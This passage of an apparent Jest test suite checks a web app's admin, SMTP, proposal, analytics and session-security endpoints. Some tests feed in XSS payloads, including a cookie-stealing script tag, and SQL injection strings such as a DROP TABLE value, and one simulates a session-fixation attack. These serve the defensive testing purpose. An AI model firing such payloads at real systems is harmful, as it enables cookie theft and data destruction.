    const usersRes = await aAdmin.get('/api/admin/users').set('X-CSRF-Token', adminCsrf);
    const user1 = usersRes.body.users.find((u: any) => u.id !== undefined);
    await aAdmin.post('/api/messages/admin/send')
      .set('X-CSRF-Token', adminCsrf)
      .send({ user_id: user1.id, message: 'Private message for user1' });

    // Get message id from user1's perspective using DB directly
    const db = getDb();
    const msg = db.prepare('SELECT id FROM user_messages WHERE user_id=? LIMIT 1').get(user1.id) as any;
    if (!msg) return; // no message created — skip

    // user2 tries to mark user1's message as read
    const res = await aUser2.post(`/api/messages/${msg.id}/read`)
      .set('X-CSRF-Token', csrf2);
    expect(res.status).toBe(404);
  });

  test('User: read-all marks all messages as read → 200', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/messages/read-all').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 14. ADMIN NOTICES — v1.8.1
// ─────────────────────────────────────────────────────────────────────────────
describe('Admin notices', () => {
  test('Non-admin cannot create notice → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf).send({ message: 'Hello' });
    expect(res.status).toBe(403);
  });

  test('Admin: create notice → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf)
      .send({ message: 'System maintenance tonight at 22:00.' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(typeof res.body.id).toBe('number');
  });

  test('Admin: create notice — empty message → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf).send({ message: '' });
    expect(res.status).toBe(400);
  });

  test('Admin: create notice — message >1000 chars → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf)
      .send({ message: 'N'.repeat(1001) });
    expect(res.status).toBe(400);
  });

  test('Admin: list notices → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.get('/api/admin/notices').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.notices)).toBe(true);
  });

  test('Admin: update notice message → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const create = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf)
      .send({ message: 'Original notice' });
    const id = create.body.id;
    const res = await a.put(`/api/admin/notices/${id}`).set('X-CSRF-Token', csrf)
      .send({ message: 'Updated notice' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Admin: deactivate notice → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const create = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf)
      .send({ message: 'Notice to deactivate' });
    const id = create.body.id;
    const res = await a.put(`/api/admin/notices/${id}`).set('X-CSRF-Token', csrf)
      .send({ active: false });
    expect(res.status).toBe(200);
  });

  test('Admin: update non-existent notice → 404', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.put('/api/admin/notices/999999').set('X-CSRF-Token', csrf)
      .send({ message: 'Updated' });
    expect(res.status).toBe(404);
  });

  test('Admin: delete notice → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const create = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf)
      .send({ message: 'To be deleted' });
    const id = create.body.id;
    const res = await a.delete(`/api/admin/notices/${id}`).set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Non-admin cannot delete notice → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.delete('/api/admin/notices/1').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 15. ADMIN SMTP SETTINGS — v1.8.1
// ─────────────────────────────────────────────────────────────────────────────
describe('Admin SMTP settings', () => {
  test('Non-admin cannot GET SMTP settings → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/smtp').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('Admin: GET SMTP settings → 200 (no password in response)', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.get('/api/admin/smtp').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.body)).not.toMatch(/password/i);
    expect(res.body).toHaveProperty('hasPass');
  });

  test('Admin: save SMTP settings → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/smtp').set('X-CSRF-Token', csrf).send({
      host: 'smtp.nhs.net', port: '587', secure: 'false',
      user: 'test@nhs.net', from: 'test@nhs.net', to: 'admin@nhs.net',
    });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Admin: save SMTP settings — missing host → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/smtp').set('X-CSRF-Token', csrf).send({
      host: '', port: '587', secure: 'false', to: 'admin@nhs.net',
    });
    expect(res.status).toBe(400);
  });

  test('Admin: save SMTP settings — missing to → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/smtp').set('X-CSRF-Token', csrf).send({
      host: 'smtp.nhs.net', port: '587', secure: 'false', to: '',
    });
    expect(res.status).toBe(400);
  });

  test('Admin: save SMTP settings — invalid port → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/smtp').set('X-CSRF-Token', csrf).send({
      host: 'smtp.nhs.net', port: '99999', secure: 'false',
      user: 'test@nhs.net', from: 'test@nhs.net', to: 'admin@nhs.net',
    });
    expect(res.status).toBe(400);
  });

  test('Admin: save SMTP settings — non-numeric port → 400', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/smtp').set('X-CSRF-Token', csrf).send({
      host: 'smtp.nhs.net', port: 'evil', secure: 'false',
      user: 'test@nhs.net', from: 'test@nhs.net', to: 'admin@nhs.net',
    });
    expect(res.status).toBe(400);
  });

  test('Non-admin cannot save SMTP settings → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/admin/smtp').set('X-CSRF-Token', csrf).send({
      host: 'smtp.nhs.net', port: '587', secure: 'false', to: 'admin@nhs.net',
    });
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 16. DROPDOWN PROPOSALS — v1.8.1
// ─────────────────────────────────────────────────────────────────────────────
describe('Dropdown proposals', () => {
  test('Admin: GET dropdown-proposals → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.get('/api/admin/dropdown-proposals').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.proposals)).toBe(true);
  });

  test('Non-admin cannot list dropdown proposals → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/dropdown-proposals').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('Admin: dismiss dropdown proposal → 200', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    // Insert a proposal directly
    const db = getDb();
    const adminId = db.prepare('SELECT id FROM users WHERE is_admin=1 ORDER BY id DESC LIMIT 1').get() as any;
    const ins = db.prepare('INSERT INTO dropdown_proposals (user_id, field_name) VALUES (?,?)').run(adminId.id, 'category');
    const res = await a.delete(`/api/admin/dropdown-proposals/${ins.lastInsertRowid}`)
      .set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  test('Non-admin cannot dismiss dropdown proposal → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.delete('/api/admin/dropdown-proposals/1').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });

  test('Dropdown propose when SMTP not configured → 503 (no free-text stored)', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Ensure SMTP is not configured (default in test env)
    const db = getDb();
    db.prepare('DELETE FROM settings WHERE key IN (?,?)').run('smtp_host', 'smtp_to');

    const proposalsBefore = (db.prepare('SELECT COUNT(*) as c FROM dropdown_proposals').get() as any).c;
    const res = await a.post('/api/dropdowns/propose').set('X-CSRF-Token', csrf)
      .send({ field_name: 'category', value: 'SomeNewCategory' });
    expect(res.status).toBe(503);
    // Verify no proposal record was left in DB when email failed
    const proposalsAfter = (db.prepare('SELECT COUNT(*) as c FROM dropdown_proposals').get() as any).c;
    expect(proposalsAfter).toBe(proposalsBefore);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 17. ANALYTICS — v1.8.1 flag data
// ─────────────────────────────────────────────────────────────────────────────
describe('Analytics with flags', () => {
  test('GET /api/analytics/session — unauthenticated → 401', async () => {
    const res = await agent().get('/api/analytics/session');
    expect(res.status).toBe(401);
  });

  test('GET /api/analytics/session — returns summary with flag fields', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/analytics/session').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('summary');
    expect(res.body.summary).toHaveProperty('byFlag');
    expect(res.body.summary).toHaveProperty('tasksWithFlags');
  });

  test('GET /api/analytics/history — returns summary with flag fields', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/analytics/history').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body.summary).toHaveProperty('byFlag');
    expect(res.body.summary).toHaveProperty('tasksWithFlags');
  });

  test('GET /api/analytics/history — unauthenticated → 401', async () => {
    const res = await agent().get('/api/analytics/history');
    expect(res.status).toBe(401);
  });

  test('GET /api/analytics/export — unauthenticated → 401', async () => {
    const res = await agent().get('/api/analytics/export');
    expect(res.status).toBe(401);
  });

  test('GET /api/analytics/export — returns xlsx content-type', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/analytics/export').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toMatch(/spreadsheetml/);
  });

  test('Analytics flag breakdown: flagged task appears in byFlag summary', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);

    // Start and complete a task
    const startRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const taskId = startRes.body.taskId;

    // Get flag option
    const flagsRes = await a.get('/api/flags').set('X-CSRF-Token', csrf);
    const flag = flagsRes.body.options[0];

    // Complete task with a flag
    await a.patch(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf).send({
      status: 'completed', outcome: 'Completed',
      end_time: new Date(Date.now() + 60000).toISOString(),
      flag_ids: [flag.id],
    });

    // Check analytics
    const analyticsRes = await a.get('/api/analytics/session').set('X-CSRF-Token', csrf);
    expect(analyticsRes.status).toBe(200);
    expect(analyticsRes.body.summary.tasksWithFlags).toBeGreaterThanOrEqual(1);
    expect(analyticsRes.body.summary.byFlag[flag.value]).toBeGreaterThanOrEqual(1);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 18. ADMIN STATS — includes proposal counts
// ─────────────────────────────────────────────────────────────────────────────
describe('Admin stats', () => {
  test('Admin stats include pendingProposalCount', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.get('/api/admin/stats').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('pendingProposalCount');
    expect(typeof res.body.pendingProposalCount).toBe('number');
  });

  test('Non-admin cannot access stats → 403', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/admin/stats').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 19. INTENDED USER FLOW — end-to-end happy paths
// ─────────────────────────────────────────────────────────────────────────────
describe('Intended user flows', () => {
  test('Full task lifecycle: start → complete with flags → analytics', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);

    // Start task
    const startRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Direct patient care', is_duty: true,
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    expect(startRes.status).toBe(200);
    const taskId = startRes.body.taskId;

    // Cannot start a second task
    const dupRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Administrative', start_time: new Date().toISOString(),
      assigned_date: new Date().toISOString().split('T')[0],
    });
    expect(dupRes.status).toBe(409);

    // Get active task
    const activeRes = await a.get('/api/tasks/active').set('X-CSRF-Token', csrf);
    expect(activeRes.status).toBe(200);
    expect(activeRes.body.task.id).toBe(taskId);

    // Get flag options
    const flagsRes = await a.get('/api/flags').set('X-CSRF-Token', csrf);
    const flagId = flagsRes.body.options[0].id;

    // Complete with flags
    const patchRes = await a.patch(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf).send({
      status: 'completed', outcome: 'Completed',
      end_time: new Date(Date.now() + 120000).toISOString(),
      flag_ids: [flagId],
    });
    expect(patchRes.status).toBe(200);

    // Check analytics
    const session = await a.get('/api/analytics/session').set('X-CSRF-Token', csrf);
    expect(session.body.summary.total).toBeGreaterThanOrEqual(1);
    expect(session.body.summary.tasksWithFlags).toBeGreaterThanOrEqual(1);
  });

  test('Pending task count: log → retrieve', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const logRes = await a.post('/api/tasks/pending-count').set('X-CSRF-Token', csrf).send({ count: 5 });
    expect(logRes.status).toBe(200);
    expect(logRes.body.count).toBe(5);
    const getRes = await a.get('/api/tasks/pending-count').set('X-CSRF-Token', csrf);
    expect(getRes.status).toBe(200);
    expect(getRes.body.count).toBe(5);
  });

  test('Admin creates user — credentials returned but no password stored in plaintext', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.post('/api/admin/users').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('username');
    expect(res.body).toHaveProperty('tempPassword');
    // Verify in DB the password is hashed, not plaintext
    const db = getDb();
    const user = db.prepare('SELECT password_hash FROM users WHERE username=?').get(res.body.username) as any;
    expect(user.password_hash).not.toBe(res.body.tempPassword);
    expect(user.password_hash).toMatch(/^\$2[ab]\$/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 20. UNINTENDED USE — boundary, abuse, and edge cases
// ─────────────────────────────────────────────────────────────────────────────
describe('Unintended use / edge cases', () => {
  test('Sending XSS in notice message — stored safely, returned as JSON', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const xss = '<script>alert("xss")</script>';
    const res = await a.post('/api/admin/notices').set('X-CSRF-Token', csrf).send({ message: xss });
    expect(res.status).toBe(200);
    // Verify returned id and no execution
    const listRes = await a.get('/api/admin/notices').set('X-CSRF-Token', csrf);
    expect(listRes.headers['content-type']).toMatch(/application\/json/);
  });

  test('Sending XSS in flag option — stored safely, returned as JSON', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const xss = '<img src=x onerror=alert(1)>';
    const res = await a.post('/api/flags/admin').set('X-CSRF-Token', csrf).send({ value: xss });
    // Either accepted (stored as plain text) or rejected (too long if >100 chars); either way no 500
    expect(res.status).not.toBe(500);
    if (res.status === 200) {
      expect(res.headers['content-type']).toMatch(/application\/json/);
    }
  });

  test('Sending XSS in admin user group name — stored safely', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const xss = '<script>alert(1)</script>';
    const res = await a.post('/api/admin/user-groups').set('X-CSRF-Token', csrf).send({ name: xss });
    expect(res.status).not.toBe(500);
    expect(res.headers['content-type']).toMatch(/application\/json/);
  });

  test('Admin message broadcast with XSS in body — stored safely', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const xss = '<script>steal(document.cookie)</script>';
    const res = await a.post('/api/messages/admin/send').set('X-CSRF-Token', csrf).send({ message: xss });
    // Server should accept it (it's short enough) but return as JSON, not HTML
    expect(res.status).not.toBe(500);
    if (res.status === 200) {
      expect(res.headers['content-type']).toMatch(/application\/json/);
    }
  });

  test('Task patch with flag_ids containing SQLi payloads — no crash', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const startRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const taskId = startRes.body.taskId;
    const end = new Date(Date.now() + 60000).toISOString();
    const patchRes = await a.patch(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf).send({
      status: 'completed', outcome: 'Completed', end_time: end,
      flag_ids: ["'; DROP TABLE task_flag_options; --", 999999, "1 OR 1=1"],
    });
    expect(patchRes.status).toBe(200);
    // Table should still exist
    expect(() => getDb().prepare('SELECT COUNT(*) FROM task_flag_options').get()).not.toThrow();
  });

  test('Admin SMTP: CSRF missing → 403', async () => {
    const a = agent();
    await createAdminSession(a);
    const res = await a.post('/api/admin/smtp').send({
      host: 'smtp.example.com', port: '587', to: 'test@example.com',
    });
    expect(res.status).toBe(403);
  });

  test('Notice create without CSRF → 403', async () => {
    const a = agent();
    await createAdminSession(a);
    const res = await a.post('/api/admin/notices').send({ message: 'No CSRF' });
    expect(res.status).toBe(403);
  });

  test('Messages admin/send without CSRF → 403', async () => {
    const a = agent();
    await createAdminSession(a);
    const res = await a.post('/api/messages/admin/send').send({ message: 'No CSRF' });
    expect(res.status).toBe(403);
  });

  test('Flag admin add without CSRF → 403', async () => {
    const a = agent();
    await createAdminSession(a);
    const res = await a.post('/api/flags/admin').send({ value: 'NoCsrf' });
    expect(res.status).toBe(403);
  });

  test('Task patch: flag_ids as non-array value — treated as no-op', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const startRes = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    const taskId = startRes.body.taskId;
    const end = new Date(Date.now() + 60000).toISOString();
    // flag_ids as a string (not array) — should not crash
    const patchRes = await a.patch(`/api/tasks/${taskId}`).set('X-CSRF-Token', csrf).send({
      status: 'completed', outcome: 'Completed', end_time: end,
      flag_ids: 'not-an-array',
    });
    expect(patchRes.status).toBe(200);
  });

  test('Extreme: start 100 tasks sequentially blocked after first active task', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
      category: 'Clinical', subcategory: 'Handover',
      start_time: new Date().toISOString(), assigned_date: new Date().toISOString().split('T')[0],
    });
    // Subsequent starts should all 409 (sequential to avoid ECONNRESET)
    for (let i = 0; i < 5; i++) {
      const r = await a.post('/api/tasks/start').set('X-CSRF-Token', csrf).send({
        category: 'Clinical', start_time: new Date().toISOString(),
        assigned_date: new Date().toISOString().split('T')[0],
      });
      expect(r.status).toBe(409);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 21. SUGGESTION REVIEW PAGE — token-gated, no login required
// ─────────────────────────────────────────────────────────────────────────────
describe('Suggestion review page', () => {
  test('GET /suggest/review — no token → 400', async () => {
    const res = await request(app).get('/suggest/review');
    expect(res.status).toBe(400);
    expect(res.text).toMatch(/missing review token/i);
  });

  test('GET /suggest/review — invalid token → 404', async () => {
    const res = await request(app).get('/suggest/review?token=invalidtoken123');
    expect(res.status).toBe(404);
    expect(res.text).toMatch(/invalid or has already been used/i);
  });

  test('POST /suggest/review — invalid token → 404', async () => {
    const res = await request(app).post('/suggest/review')
      .send('token=badtoken&value=TestValue')
      .set('Content-Type', 'application/x-www-form-urlencoded');
    expect(res.status).toBe(404);
  });

  test('POST /suggest/review — valid dropdown token → adds option and returns success page', async () => {
    const db = getDb();
    const adminId = (db.prepare('SELECT id FROM users WHERE is_admin=1 LIMIT 1').get() as any).id;
    const suffix = Date.now().toString(36) + Math.random().toString(36).slice(2);
    const tok = 'rev_dropdown_' + suffix;
    const val = `ReviewedOutcome_${suffix}`;
    db.prepare('INSERT INTO dropdown_proposals (user_id, field_name, review_token) VALUES (?,?,?)').run(adminId, 'outcome', tok);
    const res = await request(app).post('/suggest/review')
      .send(`token=${tok}&value=${val}`)
      .set('Content-Type', 'application/x-www-form-urlencoded');
    expect(res.status).toBe(200);
    expect(res.text).toMatch(new RegExp(val.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
    expect(res.text).toMatch(/added/i);
    const remaining = db.prepare('SELECT id FROM dropdown_proposals WHERE review_token=?').get(tok);
    expect(remaining).toBeUndefined();
    const opt = db.prepare('SELECT id FROM dropdown_options WHERE field_name=? AND value=?').get('outcome', val);
    expect(opt).toBeTruthy();
  });

  test('POST /suggest/review — valid flag proposal token → adds flag option', async () => {
    const db = getDb();
    const suffix = Date.now().toString(36) + Math.random().toString(36).slice(2);
    const tok = 'rev_flag_' + suffix;
    const val = `ReviewedFlagOption_${suffix}`;
    db.prepare('INSERT INTO flag_proposals (review_token) VALUES (?)').run(tok);
    const res = await request(app).post('/suggest/review')
      .send(`token=${tok}&value=${val}`)
      .set('Content-Type', 'application/x-www-form-urlencoded');
    expect(res.status).toBe(200);
    expect(res.text).toMatch(new RegExp(val.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
    const remaining = db.prepare('SELECT id FROM flag_proposals WHERE review_token=?').get(tok);
    expect(remaining).toBeUndefined();
    const flag = db.prepare('SELECT id FROM task_flag_options WHERE value=?').get(val);
    expect(flag).toBeTruthy();
  });

  test('POST /suggest/review — duplicate dropdown value → 409', async () => {
    const db = getDb();
    const adminId = (db.prepare('SELECT id FROM users WHERE is_admin=1 LIMIT 1').get() as any).id;
    db.prepare('INSERT OR IGNORE INTO dropdown_options (field_name,value,approved) VALUES (?,?,1)').run('category', 'ExistingOpt');
    const tok = 'gggg_dup_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
    db.prepare('INSERT INTO dropdown_proposals (user_id, field_name, review_token) VALUES (?,?,?)').run(adminId, 'category', tok);
    const res = await request(app).post('/suggest/review')
      .send(`token=${tok}&value=ExistingOpt`)
      .set('Content-Type', 'application/x-www-form-urlencoded');
    expect(res.status).toBe(409);
    db.prepare('DELETE FROM dropdown_proposals WHERE review_token=?').run(tok);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 22. FEEDBACK — "Send suggestion to developers"
// ─────────────────────────────────────────────────────────────────────────────
describe('User feedback endpoint', () => {
  test('POST /api/auth/feedback — unauthenticated → 401', async () => {
    const res = await request(app).post('/api/auth/feedback').send({ message: 'hello' });
    expect(res.status).toBe(401);
  });

  test('POST /api/auth/feedback — no CSRF → 403', async () => {
    const a = agent();
    await createUserSession(a);
    const res = await a.post('/api/auth/feedback').send({ message: 'hello' });
    expect(res.status).toBe(403);
  });

  test('POST /api/auth/feedback — empty message → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/auth/feedback').set('X-CSRF-Token', csrf).send({ message: '' });
    expect(res.status).toBe(400);
  });

  test('POST /api/auth/feedback — message >1000 chars → 400', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.post('/api/auth/feedback').set('X-CSRF-Token', csrf).send({ message: 'A'.repeat(1001) });
    expect(res.status).toBe(400);
  });

  test('POST /api/auth/feedback — SMTP not configured → 503', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const db = getDb();
    db.prepare("DELETE FROM settings WHERE key IN ('smtp_host','smtp_to')").run();
    const res = await a.post('/api/auth/feedback').set('X-CSRF-Token', csrf).send({ message: 'Great app!' });
    expect(res.status).toBe(503);
    expect(res.body.error).toMatch(/smtp/i);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 23. SESSION FIXATION PREVENTION
// ─────────────────────────────────────────────────────────────────────────────
describe('Session fixation prevention', () => {
  test('Login: session ID changes after successful authentication', async () => {
    const a = agent();
    // Capture the pre-auth session ID by getting a CSRF token (which creates a session)
    const csrfRes = await a.get('/api/auth/csrf-token');
    const preAuthCookie = csrfRes.headers['set-cookie']?.[0] || '';
    const preAuthSid = preAuthCookie.split(';')[0]; // e.g. "connect.sid=<value>"

    const db = getDb();
    const bcrypt = require('bcryptjs');
    const pw = 'FixationP@ss1!';
    const hash = await bcrypt.hash(pw, 4);
    const username = 'fixation_' + crypto.randomBytes(4).toString('hex');
    db.prepare(
      'INSERT INTO users (username,password_hash,is_admin,is_approved,pending_activation) VALUES (?,?,0,1,0)',
    ).run(username, hash);

    // Log in with the pre-auth session
    const loginRes = await a
      .post('/api/auth/login')
      .set('X-CSRF-Token', csrfRes.body.token)
      .send({ username, password: pw });
    expect(loginRes.status).toBe(200);
    expect(loginRes.body.success).toBe(true);

    // After login, the session cookie should have changed (new session ID)
    const postAuthCookie = loginRes.headers['set-cookie']?.[0] || '';
    const postAuthSid = postAuthCookie.split(';')[0];
    // The session ID must be different (regenerated)
    expect(postAuthSid).not.toBe('');
    expect(postAuthSid).not.toBe(preAuthSid);
  });

  test('Login: authenticated endpoint works with new session after login', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/tasks').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
  });

  test('Login: old pre-auth session cannot be replayed after successful login', async () => {
    // Create a fresh agent; get a CSRF token (this seeds a session)
    const a1 = agent();
    const a2 = agent(); // simulates attacker who fixed the session

    const csrfRes = await a1.get('/api/auth/csrf-token');
    const preAuthToken = csrfRes.body.token;

    // Attacker copies the pre-auth cookie into their own agent
    // (In a real attack they would force the victim to use this session)
    const preAuthCookies = csrfRes.headers['set-cookie'];
    if (preAuthCookies) {
      a2.set('Cookie', preAuthCookies[0]);
    }

    // Victim logs in — session is regenerated
    const db = getDb();
    const bcrypt = require('bcryptjs');
    const pw = 'FixationP@ss2!';
    const hash = await bcrypt.hash(pw, 4);
    const username = 'fixation2_' + crypto.randomBytes(4).toString('hex');
    db.prepare(
      'INSERT INTO users (username,password_hash,is_admin,is_approved,pending_activation) VALUES (?,?,0,1,0)',
    ).run(username, hash);

    await a1.post('/api/auth/login').set('X-CSRF-Token', preAuthToken).send({ username, password: pw });

    // Attacker's agent (still using the old pre-auth session) should NOT be authenticated
    const attackerRes = await a2.get('/api/tasks');
    expect(attackerRes.status).toBe(401);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 24. SMTP ERROR INFORMATION LEAKAGE
// ─────────────────────────────────────────────────────────────────────────────
describe('SMTP error information leakage', () => {
  test('Feedback SMTP error: no internal error details in response', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    // Ensure SMTP is not configured
    getDb().prepare("DELETE FROM settings WHERE key IN ('smtp_host','smtp_to')").run();
    const res = await a.post('/api/auth/feedback').set('X-CSRF-Token', csrf).send({ message: 'Test message' });
    expect(res.status).toBe(503);
    // Error message must not include raw system error details
    expect(res.body.error).not.toMatch(/ECONNREFUSED|ENOTFOUND|getaddrinfo|nodemailer/i);
    expect(res.body.error).toMatch(/smtp/i);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 25. SQL COLUMN ALLOWLIST IN COMMON-FIELDS
// ─────────────────────────────────────────────────────────────────────────────
describe('common-fields column allowlist', () => {
  test('GET /api/tasks/common-fields — returns expected fields', async () => {
    const a = agent();
    const { csrf } = await createUserSession(a);
    const res = await a.get('/api/tasks/common-fields').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('category');
    expect(res.body).toHaveProperty('subcategory');
    expect(res.body).toHaveProperty('outcome');
    expect(Array.isArray(res.body.category)).toBe(true);
    expect(Array.isArray(res.body.subcategory)).toBe(true);
    expect(Array.isArray(res.body.outcome)).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 26. ANONYMOUS PROPOSALS — no username exposed
// ─────────────────────────────────────────────────────────────────────────────
describe('Anonymous proposals', () => {
  test('Admin GET /api/admin/dropdown-proposals — no username field returned', async () => {
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.get('/api/admin/dropdown-proposals').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    for (const p of (res.body.proposals || [])) {
      expect(p).not.toHaveProperty('username');
    }
  });

  test('Admin GET /api/admin/dropdown-proposals — review_token included per proposal', async () => {
    const db = getDb();
    const adminId = (db.prepare('SELECT id FROM users WHERE is_admin=1 LIMIT 1').get() as any).id;
    const tok = 'iiii_tok_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
    db.prepare('INSERT INTO dropdown_proposals (user_id, field_name, review_token) VALUES (?,?,?)').run(adminId, 'category', tok);
    const a = agent();
    const { csrf } = await createAdminSession(a);
    const res = await a.get('/api/admin/dropdown-proposals').set('X-CSRF-Token', csrf);
    expect(res.status).toBe(200);
    const found = res.body.proposals.find((p: any) => p.review_token === tok);
    expect(found).toBeTruthy();
    db.prepare('DELETE FROM dropdown_proposals WHERE review_token=?').run(tok);
  });
});
